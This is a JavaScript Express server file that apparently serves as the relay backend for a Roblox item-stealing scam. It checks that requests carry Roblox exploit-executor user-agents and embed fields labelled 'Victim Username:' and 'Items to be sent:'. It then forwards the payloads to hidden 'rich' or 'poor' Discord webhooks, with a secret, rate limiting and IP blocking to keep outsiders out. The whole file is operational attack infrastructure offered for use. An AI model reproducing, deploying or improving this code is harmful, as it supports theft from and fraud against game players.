const express = require('express');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.json());

// Environment variables
const POOR_WEBHOOK_URL = process.env.POOR_WEBHOOK_URL || '';
const RICH_WEBHOOK_URL = process.env.RICH_WEBHOOK_URL || '';
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'your_default_secret_here';

// Validate environment variables
if (!POOR_WEBHOOK_URL || !RICH_WEBHOOK_URL) {
  throw new Error('POOR_WEBHOOK_URL and RICH_WEBHOOK_URL must be set in environment variables');
}

// Accepted user-agents
const ACCEPTED_USER_AGENTS = [
  'codex android',
  'vega x android',
  'appleware ios',
  'delta android',
  'fluxus',
  'arceus x android',
  'trigon android',
  'evon android',
  'alysse android',
  'delta/v1.0',
  'roblox/darwinrobloxapp/0.626.1.6260363 (globaldist; robloxdirectdownload)',
  'hydrogen/v1.0',
  'hydrogen/v3.0',
  'roblox/wininet',
];

// In-memory storage
const blockedIps = new Set();
const userAgents = new Map();
const keysStore = new Map(); // Format: { key: timestamp }
const requestLog = new Map(); // Format: { ip: [timestamps] }
const REQUEST_LIMIT = 3;
const TIME_WINDOW = 60 * 1000; // 60 seconds in milliseconds
const KEY_EXPIRY = 30 * 1000; // 30 seconds in milliseconds

// Cleanup expired keys every 5 seconds
setInterval(() => {
  const currentTime = Date.now();
  for (const [key, timestamp] of keysStore.entries()) {
    if (currentTime - timestamp > KEY_EXPIRY) {
      keysStore.delete(key);
    }
  }
}, 5000);

// Middleware for IP rate-limiting
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const currentTime = Date.now();

  // Initialize or clean request log for IP
  if (!requestLog.has(ip)) {
    requestLog.set(ip, []);
  }
  const requests = requestLog.get(ip).filter(t => currentTime - t <= TIME_WINDOW);
  requests.push(currentTime);
  requestLog.set(ip, requests);

  // Check rate limit
  if (requests.length > REQUEST_LIMIT) {
    if (!blockedIps.has(ip)) {
      blockedIps.add(ip);
    }
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Check if IP is blocked
  if (blockedIps.has(ip)) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  next();
});

// Get random key
app.get('/get_key', (req, res) => {
  const userAgent = req.headers['user-agent']?.toLowerCase() || '';
  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const key = uuidv4();
  keysStore.set(key, Date.now());
  res.status(200).json({ key });
});

// Use key
app.post('/use_key', (req, res) => {
  const userAgent = req.headers['user-agent']?.toLowerCase() || '';
  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const { key } = req.body || {};
  if (!key) {
    return res.status(400).json({ error: 'Key required' });
  }

  if (!keysStore.has(key)) {
    return res.status(403).json({ error: 'Invalid or expired key' });
  }

  keysStore.delete(key);
  res.status(200).json({ status: 'Key used successfully' });
});

// Post webhook (requires discUser)
app.post('/postwebhook', async (req, res) => {
  const userAgent = req.headers['user-agent']?.toLowerCase() || '';
  const discUser = req.headers['discuser'] || '';

  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Check secret
  const secret = req.headers['x-webhook-secret'] || req.body?.secret || '';
  if (secret !== WEBHOOK_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret' });
  }

  const requestJson = req.body || {};
  if (Object.values(requestJson).some(value => String(value).includes('@'))) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Mock get_webhook (replace with actual implementation)
  const webhookUrl = getWebhook(discUser); // Assume this is defined
  if (!webhookUrl) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Validate embeds
  const embeds = requestJson.embeds || [];
  if (embeds.length !== 1 || typeof embeds[0] !== 'object') {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const fields = embeds[0].fields || [];
  if (
    fields.length !== 3 ||
    fields[0]?.name !== 'Victim Username:' ||
    fields[1]?.name !== 'Items to be sent:' ||
    fields[2]?.name !== 'Summary:'
  ) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const username = fields[0]?.value || 'hi mate';
  if (username.includes(' ') || username.length > 20) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Determine webhook URL based on target
  const target = requestJson.target || 'poor';
  const realWebhookUrl = target === 'rich' ? RICH_WEBHOOK_URL : POOR_WEBHOOK_URL;

  try {
    const response = await fetch(realWebhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestJson),
    });

    if (!response.ok) {
      const text = await response.text();
      return res.status(response.status).json({ error: text });
    }

    res.status(response.status).json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ error: `Internal Server Error: ${e.message}` });
  }
});

// Proxy webhook
app.post('/webhook', async (req, res) => {
  const userAgent = req.headers['user-agent']?.toLowerCase() || '';

  // Update user-agent stats
  userAgents.set(userAgent, (userAgents.get(userAgent) || 0) + 1);

  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Check secret
  const secret = req.headers['x-webhook-secret'] || req.body?.secret || '';
  if (secret !== WEBHOOK_SECRET) {
    return res.status(403).json({ error: 'Forbidden: Invalid secret' });
  }

  const requestJson = req.body || {};
  if (Object.values(requestJson).some(value => String(value).includes('@'))) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Validate embeds
  const embeds = requestJson.embeds || [];
  if (embeds.length !== 1 || typeof embeds[0] !== 'object') {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const fields = embeds[0].fields || [];
  if (
    fields.length !== 3 ||
    fields[0]?.name !== 'Victim Username:' ||
    fields[1]?.name !== 'Items to be sent:' ||
    fields[2]?.name !== 'Summary:'
  ) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const username = fields[0]?.value || 'hi mate';
  if (username.includes(' ') || username.length > 20) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  // Redact username
  requestJson.embeds[0].fields[0].value = 'Username redacted';

  // Determine webhook URL based on target
  const target = requestJson.target || 'poor';
  const realWebhookUrl = target === 'rich' ? RICH_WEBHOOK_URL : POOR_WEBHOOK_URL;

  try {
    const response = await fetch(realWebhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestJson),
    });

    if (!response.ok) {
      const text = await response.text();
      return res.status(response.status).json({ error: text });
    }

    res.status(response.status).json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ error: `Internal Server Error: ${e.message}` });
  }
});

// Mock getWebhook function (replace with actual implementation)
function getWebhook(discUser) {
  // Replace with your actual get_webhook logic
  return discUser ? 'https://discord.com/api/webhooks/mock' : null;
}

module.exports = app;
